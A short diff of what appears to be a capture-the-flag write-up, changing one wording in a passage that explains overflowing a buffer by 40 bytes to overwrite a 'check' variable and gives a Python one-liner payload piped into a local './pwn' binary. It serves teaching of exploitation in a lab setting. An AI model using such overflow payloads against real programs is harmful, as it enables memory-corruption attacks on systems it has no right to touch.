@@ -50,7 +50,7 @@ if __name__ == "__main__":
 ```
 - First i find the offset where our input starts to overright the variable check . i get its 40 then what follows is the word i want to overflow...Taking into account the little endiannes concept.
 ``` We can also do this with the struct module of python..
-this would be this following exploit :
+this would result to this following exploit :
 python3 -c"import struct;print(b'A'*40 + struct.pack('<I',0xdeadbeed))" > exploit1
 cat exploit1 | ./pwn
 wiiiih :)
